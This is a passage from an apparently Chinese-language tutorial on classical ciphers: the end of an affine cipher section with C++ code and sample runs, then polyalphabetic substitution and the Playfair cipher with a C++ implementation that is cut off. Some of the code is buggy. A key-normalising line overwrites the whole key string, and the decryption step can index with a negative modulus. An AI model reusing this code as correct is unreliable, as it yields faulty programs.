$x_1,z_2 ∈ Z*{26} $,所以必然得结论 $x_1 = x_2$。综上可知,前提 gcd(a,26)=1 保证了仿射加密函数是一个双射函数。</p></blockquote></li><li><p>当 <code>a=1</code>,<code>b=3</code> 时,这种仿射密码就是著名的恺撒密码。</p></li></ol><p>由仿射加密函数可以看出仿射加密的密钥空间大小为 <code>12×26=312</code>。因为由 $b∈ Z_{26} $ 知,<code>b </code>有 0,1…25 共 26 种不同取值;而 $a∈ Z_{26} $ 且 $gcd(a,26)=1$,由欧拉函数易知 <code>a </code>的取值个数是 $φ (26)=φ (2×13)=φ (2)×φ (13)=1×12=12$,即 1,3,5,7,9,11,15,17,19,21,23,25。<br>由仿射加密函数 $e(x)≡ ax+b(mod 26)$可得 $ax ≡ e(x)-b(mod 26)$,因为 $gcd(a,26)=1$,可知 <code>a</code> 在$Z_{26}$ 上一定存在乘法逆元 $a^{-1}∈ Z_{26} $,使得 $aa^{-1}≡1(mod 26)$。在$ ax ≡ e(x)-b(mod 26)$两边同时左乘$a^{-1}$得$a^{-1}ax≡(a^{-1}-a)x≡x≡a^{-1}(e(x)-b)(mod 26)$,由此可得仿射加密的逆变换,即仿射解密函数为$x≡d(e(x))≡a^{-1}(e(x)-b)(mod 26)$。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/28/169037_6683232c75-5.png" alt="5.png"></p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/28/169037_c07af67175-6.jpg" alt="6.jpg"></p><h5 id="C-源码-4">C++源码</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (1-26) 内与26互素元素的乘法逆元</span></span><br><span class="line"><span class="type">int</span> multiplicative_inverse[<span class="number">26</span>] =</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">7</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">25</span>&#125;;</span><br><span class="line"></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line">string clear_key; <span class="comment">// 明钥（用于解密）</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断加密还是解密</span></span><br><span class="line"><span class="type">int</span> a, b; <span class="comment">//仿射加密函数的a,b</span></span><br><span class="line"><span class="type">int</span> tmp[N]; <span class="comment">//用于存放明文字母转换后的数字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = m.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i] = (a * (m[i] - <span class="string">&#x27;a&#x27;</span>) + b) % <span class="number">26</span>;</span><br><span class="line">        cout &lt;&lt; (<span class="type">char</span>)(tmp[i] + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ma = multiplicative_inverse[a];<span class="comment">// a乘法逆元的ma</span></span><br><span class="line">    <span class="comment">// 求mb的时候因为要-b，c++在mod的时候需要注意比如说（-6mod26）=-6</span></span><br><span class="line">    <span class="comment">//所以需要在加一次26再mod</span></span><br><span class="line">    <span class="type">int</span> mb = (((-b) * ma) % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span>;</span><br><span class="line">    <span class="type">int</span> len = m.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i] = (ma * (m[i] - <span class="string">&#x27;A&#x27;</span>) + mb) % <span class="number">26</span>;</span><br><span class="line">        cout &lt;&lt; (<span class="type">char</span>)(tmp[i] + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入仿射加密函数的a,b&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请选择解密还是加密，加密选1，解密选2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; cleartext;</span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line">请输入仿射加密函数的a,b</span><br><span class="line"><span class="number">11</span> <span class="number">6</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入明文</span><br><span class="line">sorcery</span><br><span class="line">获取的密文</span><br><span class="line">WELCYLK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">请输入仿射加密函数的a,b</span><br><span class="line"><span class="number">11</span> <span class="number">6</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密文</span><br><span class="line">WELCYLK</span><br><span class="line">获取的明文</span><br><span class="line">sorcery</span><br></pre></td></tr></table></figure><h3 id="2-多表代换密码">2. 多表代换密码</h3><p>多表代换密码是以一系列代换表依次对明文消息的字母序列进行代换的加密方法,即明文消息中出现的同一个字母,在加密时不是完全被同一固定的字母代换,而是根据其出现的位置次序用不同的字母代换。如果代换表序列是非周期的无限序列,则相应的密码称为<strong>非周期多表代换密码</strong>,这类密码对每个明文都采用了不同的代换表进行加密,故称为一次一密密码.它是<strong>理论上</strong>不可破译的密码体制。但实际应用中经常采用的是<strong>周期多表代换密码</strong>,它通常使用有限个代换表,代换表被重复使用以完成消息的加密,它是一种比单表密码体制更为安全的密码体制。<br>不妨设明文序列为$m=m_1m_2$···,代换表序列为 $\pi=\pi_1,\pi_2,···,\pi_d,\pi_1,\pi_2,···,\pi_d,··· $则使用周期为<code>d</code>的代换序列(加密密)加密明文序列<code>m</code>得密文序列为:</p><p>$$c=\pi(m)=\pi_1(m_1),\pi_2(m_2),···,\pi_d(m_d),\pi_1(m_{d+1}),\pi_2(m_{d+2}),···,\pi_d(m_{2d}),···$$</p><p>显然,当<code>d=1</code>时,多表代换密码退化为单表代换密码。<br>多表代换密码利用从明文字符到密文字符的多个映射隐藏单字母出现的统计特性(频率特性)。它将明文字符划分为长度相同的明文组,然后再对明文组进行替换。这样同一字母在明文序列中的位置不同就具有不同的密文,从而能更好地抵抗统计密码分析。<br>多表代换密码体制有很多，常见且比较典型的有 3 种:<code>Playfair </code>密码<code>Vigenere</code> 密码和<code>Hill</code> 密码。</p><h4 id="2-1-Playfair-密码">2.1 Playfair 密码</h4><h5 id="介绍-4">介绍</h5><p><code>Playfair </code>密码(Playfair Cipher)是 1854 年由 Charles Wheatstone 提出的,此后由他的朋友 Lyon Playfair 将该密码公布，所以就称为<code> Playfair</code> 密码<br><code>Playfair</code> 密码将明文字母按两个字母一组分成若干个单元,然后将这些单元替换为密文字母组合,替换时基于一个<code>5X5</code>字母矩阵,该矩阵使用一个选定的关键词来构造,其构造方法如下:从左到右,从上到下依次填入关键词的字母,若关键词中有重复字母,则<strong>第二次出现时略过</strong>,然后将字母表中剩下的字母按字母顺序依次填入矩阵中,其中字母<code>i</code>和<code>j</code>看作是同一个字符（PS：25 的矩阵只能存储 25 个字母）。同时约定如下规则:表中的第一列看作是第五列的右边一列,第一行看作是第五行的下一行。</p><p>对每一对明文字母$p_1,p_2$:、加密时根据它们在 <code>5X5 </code>字母矩阵中的位置分别处理如下。</p><p>(1)加密方法</p><ol><li><p>将明文两两分组</p><ul><li><p>明文个数为偶数，以下例子可以得到：<br>PLAYFAIRCIPHER=PL——AY——FA——IR——CI——PH——ER</p></li><li><p>若明文字母数为奇数,则在明文的末端添加一个事先约定好的字母(X)进行填充。示例：AB——C，补完变为 AB——CX</p></li><li><p>若$p_1,p_2$: 相同,则插人一个事先约定好的字母,并用上述方法处理 AA——BC 插完变为 AX——AX——CD（这里执行了一次缺补）</p><blockquote><p>同插缺补操作不分先后，执行结果相同</p></blockquote></li></ul></li><li><p>移位和替换</p><ul><li>若$p_1,p_2$:在同一行,则对应的密文分别是紧靠$p_1,p_2$右端的字母</li><li>若$p_1,p_2$:在同一列，则对应的密文分别是紧靠 $p_1,p_2$下端的字母。</li><li>若$p_1,p_2$: 不在同一行，也不在同一列,则对应的密文为以$p_1,p_2$: 为对角顶点确定的矩形的另外的两个顶点字母,按同行的原则对应。</li></ul></li><li><p>案例</p><p>假设密钥是：PLAYFAIR IS A DIGRAM CIPHER</p><p>第一步：填入不重复的密钥（如果有重复则跳过） <img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_b97de83775-6.png" alt="6.png"></p><p>第二部：将剩未出现的字母依次写入<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_bcf42f2a75-7.png" alt="7.png"></p><p>示例： P=PL——AY——FA——IR——CI——PH——ER</p><p>前四个都符合规则的第一条：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_0988d4c675-8.png" alt="8.png"><br>得到前四组的密文 C：<br>C=LA——YF——PY——RS<br>再看剩余几组：满足变换规则第三条（本质：构建子矩阵并找到反对角）<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_21c054c075-9.png" alt="9.png"><br>PS：一定要注意字母对应的顺序：明文对应同行的才是密文</p><p>所以得到：C=LA——YF——PY——RS——MR——AM——CD</p></li></ol><p>(2) 解密方法</p><p>Playfair 密码在解密时，同样是将密文分为两个字母一组，然后根据密钥产生的字母矩阵进行解密。解密过程与加密过程基本相似，只是把其中的右边改为左边,把其中的下面改为上面即可</p><h5 id="C-源码-5">C++源码</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串总是以&#x27;\0&#x27;字符结束，所以在声明字符数组时，需要考虑到这个额外的字符。</span></span><br><span class="line"><span class="type">char</span> letters[<span class="number">26</span>] = <span class="string">&quot;abcdefghiklmnopqrstuvwxyz&quot;</span>; <span class="comment">// 用于填充矩阵</span></span><br><span class="line"><span class="type">char</span> text_matrix[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line">string other;</span><br><span class="line"></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line">string clear_key; <span class="comment">// 明钥（用于解密）</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断加密还是解密</span></span><br><span class="line"><span class="type">int</span> cnt[N]; <span class="comment">// 用于辅助去重</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_matrix</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 处理好字母矩阵</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; secret_key.<span class="built_in">size</span>(); i ++ ) <span class="comment">// 去重</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(secret_key[i] == <span class="string">&#x27;j&#x27;</span>) secret_key = <span class="string">&#x27;i&#x27;</span>; <span class="comment">// 因为数组不方便存i/j，因此统一用i表示</span></span><br><span class="line">        cnt[secret_key[i] - <span class="string">&#x27;a&#x27;</span>] ++ ;</span><br><span class="line">        <span class="keyword">if</span>(cnt[secret_key[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(secret_key[i] - <span class="string">&#x27;a&#x27;</span> &lt; <span class="number">9</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                letters[secret_key[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                letters[secret_key[i] - <span class="string">&#x27;a&#x27;</span> - <span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp += secret_key[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 排序，密钥中出现过的字母变成0，排序后会在前面，未出现的自动会排好序在后面</span></span><br><span class="line">    <span class="built_in">sort</span>(letters, letters + <span class="number">25</span>);</span><br><span class="line">    <span class="type">int</span> len = tmp.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        letters[i] = tmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; letters &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; <span class="number">5</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            text_matrix[i][j] = letters[t ++ ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_text</span><span class="params">(string&amp; m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = m.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (m[i] == m[i + <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            m.<span class="built_in">insert</span>(i + <span class="number">1</span>, other);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(m.<span class="built_in">size</span>() % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        m += (m[m.<span class="built_in">size</span>() - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m.<span class="built_in">size</span>(); i += <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x1, x2, y1, y2; <span class="comment">// 寻找一组明文再矩阵的位置</span></span><br><span class="line">        <span class="type">bool</span> flag1 = <span class="literal">false</span>, flag2 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(x1 = <span class="number">0</span>; x1 &lt; <span class="number">5</span>; x1 ++ ) <span class="comment">// 找到后需要连续break两次才能跳出来</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(y1 = <span class="number">0</span>; y1 &lt; <span class="number">5</span>; y1 ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(m[i] == text_matrix[x1][y1])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag1 = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag1) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(x2 = <span class="number">0</span>; x2 &lt; <span class="number">5</span>; x2 ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(y2 = <span class="number">0</span>; y2 &lt; <span class="number">5</span>; y2 ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(m[i + <span class="number">1</span>] == text_matrix[x2][y2])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag2 = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag2) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x1 == x2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 防止越界，mod5</span></span><br><span class="line">            secret_text += text_matrix[x1][(y1 + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            secret_text += text_matrix[x2][(y2 + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (y1 == y2)</span><br><span class="line">        &#123;</span><br><span class="line">            secret_text += text_matrix[(x1 + <span class="number">1</span>) % <span class="number">5</span>][y1];</span><br><span class="line">            secret_text += text_matrix[(x2 + <span class="number">1</span>) % <span class="number">5</span>][y2];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            secret_text += text_matrix[x1][y2];</span><br><span class="line">            secret_text += text_matrix[x2][y1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文为：&quot;</span> &lt;&lt; secret_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m.<span class="built_in">size</span>(); i += <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x1, x2, y1, y2; <span class="comment">// 寻找一组明文再矩阵的位置</span></span><br><span class="line">        <span class="type">bool</span> flag1 = <span class="literal">false</span>, flag2 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(x1 = <span class="number">0</span>; x1 &lt; <span class="number">5</span>; x1 ++ ) <span class="comment">// 找到后需要连续break两次才能跳出来</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(y1 = <span class="number">0</span>; y1 &lt; <span class="number">5</span>; y1 ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(m[i] == text_matrix[x1][y1])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag1 = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag1) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(x2 = <span class="number">0</span>; x2 &lt; <span class="number">5</span>; x2 ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(y2 = <span class="number">0</span>; y2 &lt; <span class="number">5</span>; y2 ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(m[i + <span class="number">1</span>] == text_matrix[x2][y2])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag2 = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag2) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x1 == x2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 防止越界，mod5</span></span><br><span class="line">            cleartext += text_matrix[x1][(y1 - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            cleartext += text_matrix[x2][(y2 - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span 